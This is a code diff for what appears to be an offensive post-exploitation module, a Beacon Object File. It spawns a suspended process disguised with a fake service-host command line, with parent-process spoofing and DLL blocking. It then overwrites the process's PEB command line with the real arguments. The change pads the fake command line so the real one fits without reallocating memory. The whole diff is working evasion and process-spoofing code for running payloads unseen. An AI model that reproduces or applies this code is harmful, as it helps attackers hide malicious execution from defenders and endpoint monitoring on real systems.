@@ -279,7 +279,7 @@ static void SpawnCleanup(SPAWN_CTX *ctx, BOOL keepProc) {
 }
 
 static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls,
-                           BOOL noPpid, SPAWN_CTX *ctx) {
+                           BOOL noPpid, int realCmdMinBytes, SPAWN_CTX *ctx) {
     _memset(ctx, 0, sizeof(SPAWN_CTX));
     ctx->si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
@@ -364,10 +364,18 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
         ctx->si.lpAttributeList = ctx->attrList;
     }
 
-    /* Build fake command line */
-    char fakeCmd[512];
+    /* Build fake command line, padded so PEB buffer fits real args later */
+    char fakeCmd[4096];
     _memset(fakeCmd, 0, sizeof(fakeCmd));
-    MSVCRT$_snprintf(fakeCmd, sizeof(fakeCmd) - 1, "%s -k LocalServiceNetworkRestricted", spawntoA);
+    int fakeLen = MSVCRT$_snprintf(fakeCmd, sizeof(fakeCmd) - 1,
+        "%s -k LocalServiceNetworkRestricted", spawntoA);
+    if (fakeLen < 0) fakeLen = MSVCRT$strlen(fakeCmd);
+    if (realCmdMinBytes > 0 && fakeLen < realCmdMinBytes) {
+        int i;
+        for (i = fakeLen; i < realCmdMinBytes && i < (int)sizeof(fakeCmd) - 1; i++)
+            fakeCmd[i] = ' ';
+        fakeCmd[i] = '\0';
+    }
 
     DWORD flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
     if (attrCount > 0) flags |= EXTENDED_STARTUPINFO_PRESENT;
@@ -454,26 +462,9 @@ static BOOL SpoofCommandLine(HANDLE hProcess, const char *realCmdA) {
     KERNEL32$MultiByteToWideChar(0, 0, realCmdA, -1, wideBuf, wideLen);
 
     USHORT realSizeBytes = (USHORT)(wideLen * sizeof(WCHAR));
-    PVOID pTargetBuf = params.CommandLine.Buffer;
     SIZE_T bw = 0;
 
-    if (realSizeBytes > params.CommandLine.MaximumLength) {
-        pTargetBuf = KERNEL32$VirtualAllocEx(hProcess, NULL, realSizeBytes,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!pTargetBuf) {
-            KERNEL32$LocalFree(wideBuf);
-            return FALSE;
-        }
-        KERNEL32$WriteProcessMemory(hProcess,
-            (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Buffer),
-            &pTargetBuf, sizeof(PVOID), &bw);
-        USHORT newMax = realSizeBytes;
-        KERNEL32$WriteProcessMemory(hProcess,
-            (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.MaximumLength),
-            &newMax, sizeof(USHORT), &bw);
-    }
-
-    KERNEL32$WriteProcessMemory(hProcess, pTargetBuf, wideBuf, realSizeBytes, &bw);
+    KERNEL32$WriteProcessMemory(hProcess, params.CommandLine.Buffer, wideBuf, realSizeBytes, &bw);
 
     USHORT newLen = (USHORT)((wideLen - 1) * sizeof(WCHAR));
     KERNEL32$WriteProcessMemory(hProcess,
@@ -797,9 +788,18 @@ void go(char *rawArgs, int rawLen) {
                  timeoutMs / 1000,
                  spawntoA);
 
+    /* Compute real command line length so fake can be padded to fit */
+    int realCmdMinBytes = 0;
+    if (mode == MODE_PE && args && args[0]) {
+        const char *bn = spawntoA;
+        const char *s = spawntoA;
+        while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }
+        realCmdMinBytes = MSVCRT$strlen(bn) + 1 + MSVCRT$strlen(args);
+    }
+
     /* Create suspended process */
     SPAWN_CTX sctx;
-    if (!SpawnSuspended(spawntoA, wantOutput, blockDlls, noPpid, &sctx)) {
+    if (!SpawnSuspended(spawntoA, wantOutput, blockDlls, noPpid, realCmdMinBytes, &sctx)) {
         if (freePayload) KERNEL32$LocalFree(payloadData);
         return;
     }
